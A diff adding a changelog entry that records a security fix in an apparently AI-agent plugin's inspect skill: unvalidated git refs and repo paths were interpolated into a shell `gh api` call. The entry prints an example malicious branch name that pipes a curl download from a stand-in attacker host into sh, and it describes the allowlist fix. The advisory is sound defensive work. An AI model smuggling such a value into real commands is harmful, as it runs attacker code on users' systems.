@@ -6,6 +6,17 @@ Entries are reverse-chronological (newest first) and reference the merging PR + 
 
 ---
 
+## v0.50.3
+
+Validate `<ref>` and `<path>` against a strict allowlist before `inspect/SKILL.md` interpolates either into a `gh api` Bash call — closes #348.
+
+- **Gap closed** — `/ievo:inspect <owner>/<repo>@<ref>` is designed to run pre-install on any public repo, so both the caller-supplied `<ref>` and, in Step 4, `<path>` values pulled from the target repo's own tree listing are attacker-controlled. `git check-ref-format` forbids control characters, spaces, and a handful of glob characters, but not backtick, `$`, `(`, `)`, `;`, `|`, or quotes — a ref like `` main`curl evil.tld|sh` `` is a legal branch name that would execute as a shell command once interpolated into a double-quoted `gh api "...<ref>..."` string. Step 4 repeats the same pattern for `<path>`, sourced from the repo's own (equally attacker-controlled) tree listing.
+- **Fix** — Step 1 now validates the resolved `<ref>` against an allowlist (`^[A-Za-z0-9._/-]+$`, no leading `-`, no `..` or `@{`) before it is used in Step 2 or any later `gh api` call, exiting cleanly on failure. Step 4 applies the same allowlist to every `<path>` before it is interpolated into a `contents/<path>` fetch (4a-4e), skipping and noting the item in the output footer on failure rather than aborting the whole inspect. Added a corresponding invariant to the Rules section.
+- **Scope** — confined to `plugins/ievo/skills/inspect/SKILL.md`; a textual instruction constraint, no new script or tests required. The companion `security-check/SKILL.md` finding (same root cause, tracked separately in #347) is not bundled here.
+- **Version** — bump per AGENTS.md rules (`fix:` → patch, edits a plugin file under `plugins/ievo/**`); `discover.mjs` and `evolution_candidates.mjs` `SCRIPT_VERSION`, `plugin.json`, `marketplace.json`, and the AGENTS.md compliance ledger updated in lockstep. No `plugins/ievo/scripts/` logic change — the 100% coverage gate is untouched.
+
+---
+
 ## v0.50.2
 
 Neutralize markdown image/link syntax in security-auditor's public report excerpts to close a live-rendering exfiltration beacon — closes #350.
